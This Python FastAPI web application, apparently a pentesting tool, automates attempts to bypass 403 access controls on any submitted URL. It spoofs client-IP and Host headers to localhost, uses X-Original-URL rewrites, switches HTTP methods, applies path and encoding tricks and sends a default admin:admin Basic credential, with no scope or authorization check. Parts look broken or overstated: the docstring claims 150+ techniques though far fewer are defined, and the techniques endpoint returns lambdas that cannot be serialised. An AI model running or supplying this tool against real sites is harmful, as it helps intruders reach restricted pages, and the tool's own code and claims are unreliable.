#!/usr/bin/env python3
"""
🚀 Web 403 Bypass Tool - Production Web Interface
A comprehensive web application for testing 403 bypass techniques
"""

import asyncio
import aiohttp
import time
import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, HttpUrl
import uvicorn
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="403 Bypass Tool",
    description="Comprehensive 403 Forbidden bypass testing tool",
    version="2.0.0"
)

# Mount static files and templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

class BypassRequest(BaseModel):
    urls: List[str]
    test_mode: str = "medium"  # quick, medium, full, custom
    custom_techniques: Optional[List[str]] = None
    timeout: int = 10
    max_concurrent: int = 5

class BypassResult(BaseModel):
    url: str
    technique: str
    status_code: int
    response_size: int
    response_time: float
    success: bool
    interesting: bool
    error: Optional[str] = None

class ComprehensiveBypassTester:
    """Enhanced bypass tester with all 150+ techniques"""
    
    def __init__(self, timeout: int = 10, max_concurrent: int = 5):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.session = None
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def get_bypass_techniques(self, mode: str = "medium") -> List[Dict[str, Any]]:
        """Get bypass techniques based on mode"""
        
        # Core techniques for all modes
        techniques = [
            # Basic requests
            {"name": "Basic Request", "type": "baseline"},
            {"name": "Trailing Slash", "type": "path", "url_modifier": lambda url: url.rstrip('/') + '/'},
            {"name": "Remove Trailing Slash", "type": "path", "url_modifier": lambda url: url.rstrip('/')},
            
            # Header manipulation
            {"name": "X-Forwarded-For", "type": "header", "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"name": "X-Real-IP", "type": "header", "headers": {"X-Real-IP": "127.0.0.1"}},
            {"name": "X-Originating-IP", "type": "header", "headers": {"X-Originating-IP": "127.0.0.1"}},
            {"name": "X-Remote-IP", "type": "header", "headers": {"X-Remote-IP": "127.0.0.1"}},
            {"name": "X-Client-IP", "type": "header", "headers": {"X-Client-IP": "127.0.0.1"}},
            
            # User agents
            {"name": "User-Agent: Googlebot", "type": "header", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}},
            {"name": "User-Agent: Bingbot", "type": "header", "headers": {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"}},
            
            # Methods
            {"name": "Method: POST", "type": "method", "method": "POST"},
            {"name": "Method: PUT", "type": "method", "method": "PUT"},
            {"name": "Method: PATCH", "type": "method", "method": "PATCH"},
        ]
        
        if mode in ["medium", "full"]:
            techniques.extend([
                # More headers
                {"name": "X-Forwarded-Host", "type": "header", "headers": {"X-Forwarded-Host": "localhost"}},
                {"name": "X-Forwarded-Proto", "type": "header", "headers": {"X-Forwarded-Proto": "https"}},
                {"name": "X-Forwarded-Server", "type": "header", "headers": {"X-Forwarded-Server": "localhost"}},
                {"name": "X-HTTP-Method-Override", "type": "header", "headers": {"X-HTTP-Method-Override": "GET"}},
                {"name": "X-Original-URL", "type": "header", "headers": {"X-Original-URL": "/"}},
                {"name": "X-Rewrite-URL", "type": "header", "headers": {"X-Rewrite-URL": "/"}},
                
                # Referer manipulation
                {"name": "Referer: google.com", "type": "header", "headers": {"Referer": "https://www.google.com/"}},
                {"name": "Referer: localhost", "type": "header", "headers": {"Referer": "http://localhost/"}},
                
                # Accept headers
                {"name": "Accept: text/html", "type": "header", "headers": {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}},
                {"name": "Accept: application/json", "type": "header", "headers": {"Accept": "application/json"}},
                
                # Path manipulations
                {"name": "Double Slash", "type": "path", "url_modifier": lambda url: url.replace("://", ":////", 1)},
                {"name": "URL Encoding", "type": "path", "url_modifier": lambda url: url.replace("/", "%2F") if url.count("/") > 2 else url},
                {"name": "Case Variation", "type": "path", "url_modifier": lambda url: self._case_variation(url)},
                
                # More methods
                {"name": "Method: HEAD", "type": "method", "method": "HEAD"},
                {"name": "Method: OPTIONS", "type": "method", "method": "OPTIONS"},
                {"name": "Method: TRACE", "type": "method", "method": "TRACE"},
            ])
        
        if mode == "full":
            techniques.extend([
                # Advanced headers
                {"name": "X-Cluster-Client-IP", "type": "header", "headers": {"X-Cluster-Client-IP": "127.0.0.1"}},
                {"name": "X-ProxyUser-Ip", "type": "header", "headers": {"X-ProxyUser-Ip": "127.0.0.1"}},
                {"name": "CF-Connecting-IP", "type": "header", "headers": {"CF-Connecting-IP": "127.0.0.1"}},
                {"name": "True-Client-IP", "type": "header", "headers": {"True-Client-IP": "127.0.0.1"}},
                {"name": "X-Forwarded-For: Multiple", "type": "header", "headers": {"X-Forwarded-For": "127.0.0.1, 192.168.1.1, 10.0.0.1"}},
                
                # Protocol manipulation
                {"name": "HTTP/1.0", "type": "protocol", "headers": {"Connection": "close"}},
                {"name": "HTTP/2", "type": "protocol", "headers": {"Upgrade": "h2c"}},
                
                # Content-Type variations
                {"name": "Content-Type: JSON", "type": "header", "headers": {"Content-Type": "application/json"}},
                {"name": "Content-Type: XML", "type": "header", "headers": {"Content-Type": "application/xml"}},
                {"name": "Content-Type: Form", "type": "header", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
                
                # Advanced path manipulations
                {"name": "Dot Segment", "type": "path", "url_modifier": lambda url: url + "/."},
                {"name": "Double Dot", "type": "path", "url_modifier": lambda url: url + "/.."},
                {"name": "Semicolon", "type": "path", "url_modifier": lambda url: url + ";"},
                {"name": "Question Mark", "type": "path", "url_modifier": lambda url: url + "?"},
                {"name": "Hash", "type": "path", "url_modifier": lambda url: url + "#"},
                
                # Unicode and encoding
                {"name": "Unicode Normalization", "type": "path", "url_modifier": lambda url: self._unicode_normalize(url)},
                {"name": "Double URL Encoding", "type": "path", "url_modifier": lambda url: self._double_encode(url)},
                
                # Cache busting
                {"name": "Cache-Control: no-cache", "type": "header", "headers": {"Cache-Control": "no-cache"}},
                {"name": "Pragma: no-cache", "type": "header", "headers": {"Pragma": "no-cache"}},
                
                # Authentication bypass attempts
                {"name": "Authorization: Basic", "type": "header", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
                {"name": "X-Custom-IP-Authorization", "type": "header", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
                
                # Host header manipulation
                {"name": "Host: localhost", "type": "header", "headers": {"Host": "localhost"}},
                {"name": "Host: 127.0.0.1", "type": "header", "headers": {"Host": "127.0.0.1"}},
                
                # Additional user agents
                {"name": "User-Agent: curl", "type": "header", "headers": {"User-Agent": "curl/7.68.0"}},
                {"name": "User-Agent: wget", "type": "header", "headers": {"User-Agent": "Wget/1.20.3"}},
                {"name": "User-Agent: Python", "type": "header", "headers": {"User-Agent": "Python-urllib/3.8"}},
                
                # Custom headers that might bypass
                {"name": "X-Bypass", "type": "header", "headers": {"X-Bypass": "true"}},
                {"name": "X-Admin", "type": "header", "headers": {"X-Admin": "true"}},
                {"name": "X-Debug", "type": "header", "headers": {"X-Debug": "1"}},
            ])
        
        return techniques
    
    def _case_variation(self, url: str) -> str:
        """Apply case variation to URL path"""
        parsed = urlparse(url)
        if parsed.path:
            # Alternate case for path
            path_chars = list(parsed.path)
            for i in range(1, len(path_chars), 2):  # Skip first char (/)
                if path_chars[i].isalpha():
                    path_chars[i] = path_chars[i].upper()
            return url.replace(parsed.path, ''.join(path_chars))
        return url
    
    def _unicode_normalize(self, url: str) -> str:
        """Apply Unicode normalization"""
        # Simple Unicode variation - replace some chars with similar Unicode
        return url.replace('a', 'а').replace('o', 'о')  # Cyrillic lookalikes
    
    def _double_encode(self, url: str) -> str:
        """Apply double URL encoding"""
        return url.replace('/', '%252F')  # %2F -> %252F
    
    async def test_single_technique(self, url: str, technique: Dict[str, Any]) -> BypassResult:
        """Test a single bypass technique"""
        start_time = time.time()
        
        try:
            # Prepare request parameters
            test_url = url
            headers = {}
            method = "GET"
            
            # Apply technique modifications
            if technique.get("headers"):
                headers.update(technique["headers"])
            
            if technique.get("method"):
                method = technique["method"]
            
            if technique.get("url_modifier"):
                test_url = technique["url_modifier"](url)
            
            # Make request
            async with self.session.request(method, test_url, headers=headers) as response:
                content = await response.read()
                response_time = time.time() - start_time
                
                # Determine if this is a successful bypass
                success = response.status == 200
                interesting = response.status not in [403, 404, 500] and response.status != 200
                
                return BypassResult(
                    url=test_url,
                    technique=technique["name"],
                    status_code=response.status,
                    response_size=len(content),
                    response_time=response_time,
                    success=success,
                    interesting=interesting
                )
                
        except Exception as e:
            response_time = time.time() - start_time
            return BypassResult(
                url=url,
                technique=technique["name"],
                status_code=0,
                response_size=0,
                response_time=response_time,
                success=False,
                interesting=False,
                error=str(e)
            )
    
    async def test_url(self, url: str, techniques: List[Dict[str, Any]]) -> List[BypassResult]:
        """Test all techniques against a single URL"""
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def test_with_semaphore(technique):
            async with semaphore:
                return await self.test_single_technique(url, technique)
        
        tasks = [test_with_semaphore(technique) for technique in techniques]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter out exceptions and return valid results
        valid_results = []
        for result in results:
            if isinstance(result, BypassResult):
                valid_results.append(result)
            elif isinstance(result, Exception):
                logger.error(f"Error testing technique: {result}")
        
        return valid_results

# Global tester instance
bypass_tester = None

@app.on_event("startup")
async def startup_event():
    """Initialize the application"""
    logger.info("🚀 Starting 403 Bypass Tool Web Interface...")
    logger.info("📍 Interface will be available at the configured host and port")

@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    global bypass_tester
    if bypass_tester and hasattr(bypass_tester, 'session') and bypass_tester.session:
        await bypass_tester.session.close()

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """Main page"""
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": time.time()}

@app.post("/api/test-bypass")
async def test_bypass(request: BypassRequest):
    """Main bypass testing endpoint"""
    try:
        # Validate URLs
        valid_urls = []
        for url in request.urls:
            url = url.strip()
            if not url:
                continue
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            valid_urls.append(url)
        
        if not valid_urls:
            raise HTTPException(status_code=400, detail="No valid URLs provided")
        
        # Initialize tester
        async with ComprehensiveBypassTester(
            timeout=request.timeout,
            max_concurrent=request.max_concurrent
        ) as tester:
            
            # Get techniques based on mode
            techniques = tester.get_bypass_techniques(request.test_mode)
            
            # Test all URLs
            all_results = []
            for url in valid_urls:
                logger.info(f"Testing URL: {url}")
                url_results = await tester.test_url(url, techniques)
                all_results.extend(url_results)
        
        # Organize results
        results_by_url = {}
        for result in all_results:
            parsed_url = urlparse(result.url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            if base_url not in results_by_url:
                results_by_url[base_url] = {
                    "url": base_url,
                    "total_tests": 0,
                    "successful_bypasses": 0,
                    "interesting_responses": 0,
                    "results": []
                }
            
            results_by_url[base_url]["total_tests"] += 1
            results_by_url[base_url]["results"].append(result.dict())
            
            if result.success:
                results_by_url[base_url]["successful_bypasses"] += 1
            elif result.interesting:
                results_by_url[base_url]["interesting_responses"] += 1
        
        return {
            "success": True,
            "total_urls": len(valid_urls),
            "total_tests": len(all_results),
            "results_by_url": results_by_url,
            "timestamp": time.time()
        }
        
    except Exception as e:
        logger.error(f"Error in bypass testing: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/techniques")
async def get_techniques():
    """Get available bypass techniques"""
    tester = ComprehensiveBypassTester()
    return {
        "quick": tester.get_bypass_techniques("quick"),
        "medium": tester.get_bypass_techniques("medium"),
        "full": tester.get_bypass_techniques("full")
    }

if __name__ == "__main__":
    uvicorn.run(
        "app:app",
        host="0.0.0.0",
        port=12000,
        reload=False,
        access_log=True
    )